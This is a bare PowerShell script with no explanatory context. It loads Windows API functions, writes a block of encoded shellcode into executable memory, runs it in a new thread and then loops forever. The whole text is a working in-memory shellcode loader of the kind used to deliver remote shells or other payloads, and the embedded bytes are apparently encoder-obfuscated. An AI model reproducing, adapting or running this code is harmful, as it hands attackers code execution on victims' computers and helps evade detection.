
$FX2 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $FX2 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x15,0xbd,0x83,0x77,0xda,0xc0,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x47,0x83,0xc2,0x04,0x31,0x42,0x0f,0x03,0x42,0x1a,0x5f,0x76,0x8b,0xcc,0x1d,0x79,0x74,0x0c,0x42,0xf3,0x91,0x3d,0x42,0x67,0xd1,0x6d,0x72,0xe3,0xb7,0x81,0xf9,0xa1,0x23,0x12,0x8f,0x6d,0x43,0x93,0x3a,0x48,0x6a,0x24,0x16,0xa8,0xed,0xa6,0x65,0xfd,0xcd,0x97,0xa5,0xf0,0x0c,0xd0,0xd8,0xf9,0x5d,0x89,0x97,0xac,0x71,0xbe,0xe2,0x6c,0xf9,0x8c,0xe3,0xf4,0x1e,0x44,0x05,0xd4,0xb0,0xdf,0x5c,0xf6,0x33,0x0c,0xd5,0xbf,0x2b,0x51,0xd0,0x76,0xc7,0xa1,0xae,0x88,0x01,0xf8,0x4f,0x26,0x6c,0x35,0xa2,0x36,0xa8,0xf1,0x5d,0x4d,0xc0,0x02,0xe3,0x56,0x17,0x79,0x3f,0xd2,0x8c,0xd9,0xb4,0x44,0x69,0xd8,0x19,0x12,0xfa,0xd6,0xd6,0x50,0xa4,0xfa,0xe9,0xb5,0xde,0x06,0x61,0x38,0x31,0x8f,0x31,0x1f,0x95,0xd4,0xe2,0x3e,0x8c,0xb0,0x45,0x3e,0xce,0x1b,0x39,0x9a,0x84,0xb1,0x2e,0x97,0xc6,0xdd,0x83,0x9a,0xf8,0x1d,0x8c,0xad,0x8b,0x2f,0x13,0x06,0x04,0x03,0xdc,0x80,0xd3,0x64,0xf7,0x75,0x4b,0x9b,0xf8,0x85,0x45,0x5f,0xac,0xd5,0xfd,0x76,0xcd,0xbd,0xfd,0x77,0x18,0x2b,0xfb,0xef,0xa9,0x6b,0x0e,0xb5,0xc5,0x71,0x11,0x48,0xad,0xff,0xf7,0x1a,0x81,0xaf,0xa7,0xda,0x71,0x10,0x18,0xb2,0x9b,0x9f,0x47,0xa2,0xa3,0x75,0xe0,0x48,0x4c,0x20,0x58,0xe4,0xf5,0x69,0x12,0x95,0xfa,0xa7,0x5e,0x95,0x71,0x44,0x9e,0x5b,0x72,0x21,0x8c,0x0b,0x72,0x7c,0xee,0x9d,0x8d,0xaa,0x85,0x21,0x18,0x51,0x0c,0x76,0xb4,0x5b,0x69,0xb0,0x1b,0xa3,0x5c,0xcb,0x92,0x31,0x1f,0xa3,0xda,0xd5,0x9f,0x33,0x8d,0xbf,0x9f,0x5b,0x69,0xe4,0xf3,0x7e,0x76,0x31,0x60,0xd3,0xe3,0xba,0xd1,0x80,0xa4,0xd2,0xdf,0xff,0x83,0x7c,0x1f,0x2a,0x12,0x40,0xf6,0x12,0x60,0xa8,0xca;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$QQZY=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($QQZY.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$QQZY,0,0,0);for (;;){Start-sleep 60};
